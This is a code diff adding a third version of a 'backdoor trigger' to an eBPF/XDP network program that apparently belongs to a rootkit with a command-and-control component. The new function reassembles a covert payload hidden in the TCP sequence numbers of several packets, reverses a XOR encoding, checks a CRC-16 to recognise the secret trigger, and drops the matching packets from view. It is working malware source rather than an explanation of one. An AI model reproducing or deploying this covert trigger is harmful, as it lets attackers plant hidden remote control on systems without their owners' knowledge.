@@ -9,6 +9,7 @@
 
 #include "../data/ring_buffer.h"
 #include "../../common/c&c.h"
+#include "../bpf/defs.h"
 
 static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size){
     char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
@@ -132,9 +133,99 @@ backdoor_finish:
 
 
     return XDP_DROP; 
+}
 
 
+static __always_inline int manage_backdoor_trigger_v3(struct backdoor_packet_log_data b_data){
+    int last_received = b_data.last_packet_modified;
+    int first_packet;
+    if(last_received>0&&last_received<3){
+        first_packet = last_received-1;
+    }else{
+        first_packet = (CC_STREAM_TRIGGER_PAYLOAD_LEN / CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES) -1;
+    } 
 
+    //The following routine (not just the next check) is necessarily dirty in terms of programming,
+    //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
+    char payload[CC_STREAM_TRIGGER_PAYLOAD_LEN] = {0};
+    if(first_packet == 1){
+        for(int ii=first_packet; ii<3; ii++){
+            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
+        }
+        for(int ii=0; ii<first_packet; ii++){
+            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
+        }
+    }else if(first_packet == 2){
+        for(int ii=first_packet; ii<3; ii++){
+            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
+        }
+        for(int ii=0; ii<first_packet; ii++){
+            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
+        }
+    }else if(first_packet == 3){
+        for(int ii=first_packet; ii<3; ii++){
+            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
+        }
+        for(int ii=0; ii<first_packet; ii++){
+            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
+        }
+    }
+    
+    bpf_printk("Payload before XOR: ");
+    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+        bpf_printk("%x", payload[ii]);
+    }
+    bpf_printk("\n");
+
+    //Now that we have the possible complete stream, let's search for the secret backdoor combination in it
+    //First undo running XOR
+    for(int ii=CC_STREAM_TRIGGER_PAYLOAD_LEN-1; ii>0; ii--){
+        char xor_res = payload[ii-1] ^ payload[ii];
+        __builtin_memcpy(payload+ii, (char*)&(xor_res), 0x01);
+    }
+
+    bpf_printk("Payload after XOR: ");
+    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+        bpf_printk("%x", payload[ii]);
+    }
+    bpf_printk("\n");
+
+    //Now compute CRC
+    __u8 x;
+    __u16 crc = 0xFFFF;
+    __u8 length = 0x0A;
+    char *payload_p = payload;
+
+    while (length--){
+        x = crc >> 8 ^ *payload_p++;
+        x ^= x>>4;
+        crc = (crc << 8) ^ ((__u16)(x << 12)) ^ ((__u16)(x <<5)) ^ ((__u16)x);
+    }
+
+    //Check CRC with the one received
+    char crc_char1, crc_char2;
+    __builtin_memcpy(&crc_char1, (char*)&(crc), sizeof(__u8));
+    __builtin_memcpy(&crc_char2, (char*)&(crc)+1, sizeof(__u8));
+    if(crc_char1 != payload[0x0A]){
+        bpf_printk("Failed backdoor V3 check 1: %x vs %x\n", crc_char1, payload[0x0A]);
+        return XDP_PASS;
+    }
+    if(crc_char2 != payload[0x0B]){
+        bpf_printk("Failed backdoor V3 check 2: %x vs %x\n", crc_char2, payload[0x0B]);
+        return XDP_PASS;
+    }
+
+
+    bpf_printk("Completed backdoor trigger v3, b_data position: %i\n", b_data.last_packet_modified);
+
+
+    return XDP_DROP;
 }
 
 #endif
